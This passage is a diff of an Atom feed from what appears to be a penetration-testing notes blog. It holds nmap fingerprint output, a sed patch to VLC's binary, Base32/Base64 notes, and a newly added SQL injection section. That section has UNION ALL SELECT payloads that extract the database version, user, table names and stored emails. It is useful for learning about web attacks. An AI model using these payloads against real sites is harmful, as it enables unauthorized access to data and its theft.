 &lt;span class=&quot;n&quot;&gt;SF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nericLines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;F&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;&quot;HTTP/1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;20400&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;20Bad&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;20Request&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Content-Length:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;2
 SF:015&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n\r\n&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;400&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;20Bad&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;20Request&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
@@ -421,6 +544,7 @@ Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/
    <id>https://beven.co.zw/2021/03/15/Useful-Tricks-Tips</id>
    <content type="html">&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/geteuid/getppid/'&lt;/span&gt; /usr/bin/vlc
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
 &lt;ul&gt;
   &lt;li&gt;Base32 is a common transfer encoding. It consists of 32-char set. These char-sets are usually alphabet in uppercase.&lt;/li&gt;
   &lt;li&gt;Base64 is another common transfer encoding. It consists of 64-char set. These char-sets are usually alphabet in uppercase and lowercase.&lt;/li&gt;
@@ -644,6 +768,18 @@ df -k
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;Now we can easily access the mount folder now.&lt;/p&gt;
+
+&lt;h1 id=&quot;sql-injections&quot;&gt;SQL Injections&lt;/h1&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+bob@livemail.com&lt;span class=&quot;s1&quot;&gt;' UNION ALL SELECT concat_ws(0x3a, version(), user(), database())--
+
+
+bob@livemail.com'&lt;/span&gt; UNION ALL SELECT TABLE_NAME FROM information_schema.TABLES WHERE &lt;span class=&quot;nv&quot;&gt;table_schema&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;database&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;
+
+bob@livemail.com&lt;span class=&quot;s1&quot;&gt;' UNION ALL SELECT email FROM table_name--
+
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 </content>
  </entry>
  
